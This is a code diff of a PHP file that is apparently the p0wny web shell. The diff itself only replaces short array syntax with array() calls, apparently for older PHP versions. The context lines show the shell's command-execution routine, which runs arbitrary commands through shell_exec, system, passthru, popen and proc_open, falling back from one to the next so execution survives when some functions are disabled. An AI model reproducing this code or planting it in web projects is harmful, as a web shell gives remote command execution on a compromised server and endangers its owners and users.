@@ -1,9 +1,9 @@
 <?php
 
-$SHELL_CONFIG = [
+$SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
-];
+);
 
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
@@ -13,7 +13,7 @@ function expandPath($path) {
     return $path;
 }
 
-function allFunctionExist($list = []) {
+function allFunctionExist($list = array()) {
     foreach ($list as $entry) {
         if (!function_exists($entry)) {
             return false;
@@ -29,24 +29,24 @@ function executeCommand($cmd) {
         $output = implode("\n", $output);
     } else if (function_exists('shell_exec')) {
         $output = shell_exec($cmd);
-    } else if (allFunctionExist(['system', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
+    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
         ob_start();
         system($cmd);
         $output = ob_get_contents();
         ob_end_clean();
-    } else if (allFunctionExist(['passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
+    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
         ob_start();
         passthru($cmd);
         $output = ob_get_contents();
         ob_end_clean();
-    } else if (allFunctionExist(['popen', 'feof', 'fread', 'pclose'])) {
+    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
         $handle = popen($cmd, 'r');
         while (!feof($handle)) {
             $output .= fread($handle, 4096);
         }
         pclose($handle);
-    } else if (allFunctionExist(['proc_open', 'stream_get_contents', 'proc_close'])) {
-        $handle = proc_open($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
+    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
         $output = stream_get_contents($pipes[1]);
         proc_close($handle);
     }
